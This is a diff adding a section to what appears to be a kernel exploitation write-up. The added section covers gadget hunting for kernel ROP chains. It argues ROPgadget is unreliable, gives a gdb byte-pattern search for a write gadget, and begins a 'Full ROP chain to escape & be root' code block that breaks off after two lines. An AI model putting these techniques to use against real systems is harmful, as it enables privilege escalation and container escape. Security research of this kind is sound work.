@@ -432,6 +432,43 @@ From `task_struct`, the kernel stack pointer is read. Knowledge of the stack bas
 
 ## 12. Kernel ROP Construction
 
+During exploitation, common gadget-finding tools such as `ROPgadget` were found to be unreliable when applied to the kernel image.
+
+In practice, `ROPgadget` may:
+- report non-existent gadgets due to incorrect disassembly
+- interpret embedded data as executable code
+- miss valid gadgets hidden inside larger instruction sequences
+
+This is especially problematic in kernel exploitation, where:
+- the executable range is large
+- alignment constraints differ from userland
+- incorrect gadgets often lead to silent crashes or triple faults
+
+### Raw GDB Memory Scanning
+
+A significantly more reliable approach is to search the kernel text section directly using `gdb` byte patterns:
+
+```c
+find /b 0xffffffff81000000, 0xffffffff82ffffff, 0x48, 0x89, 0x17, 0xc3
+```
+
+This search locates the raw instruction sequence:
+
+```c
+mov qword ptr [rdi], rdx
+ret
+```
+
+Advantages of this method:
+- avoids false positives caused by speculative disassembly
+- guarantees the exact instruction sequence exists in executable memory
+- allows manual validation of surrounding context
+- scales well for simple, high-value gadgets (mov, pop, xchg, ret)
+
+In practice, this approach proved both faster and more reliable than automated gadget enumeration when building kernel ROP chains.
+
+### Full ROP chain to escape & be root
+
 ```c
 uint64_t rop[(KMALLOC_1024_SIZE - 0x40) / 8] = {0};
 uint64_t *p = rop;
